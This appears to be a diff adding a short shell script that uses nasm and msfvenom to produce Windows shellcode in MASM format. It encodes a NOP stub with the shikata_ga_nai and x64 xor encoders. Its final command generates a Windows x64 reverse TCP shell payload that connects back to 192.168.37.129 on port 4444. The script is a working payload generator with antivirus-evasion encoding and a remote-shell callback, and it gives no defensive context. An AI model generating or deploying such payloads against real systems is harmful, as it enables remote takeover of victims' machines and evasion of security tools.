@@ -1,0 +1,22 @@
+echo "Creating x86 shikataganai encoded shellcode as MASM format"
+echo "----------------------------------------------------------"
+nasm nop.asm -o nop.bin
+xxd -p nop.bin
+cat nop.bin | msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai -f masm
+
+echo ""
+echo ""
+echo ""
+
+echo "Creating x64 xor encoded shellcode as MASM format"
+echo "-------------------------------------------------"
+nasm nop.asm -o nop.bin
+xxd -p nop.bin
+cat nop.bin | msfvenom -p - -a x64 --platform windows -e x64/xor -f masm
+
+echo ""
+echo ""
+echo ""
+
+echo "Creating Windows x64 reverse_shell_tcp (192.168.37.129:4444) as MASM format"
+msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp lhost=192.168.37.129 lport=4444 -f masm
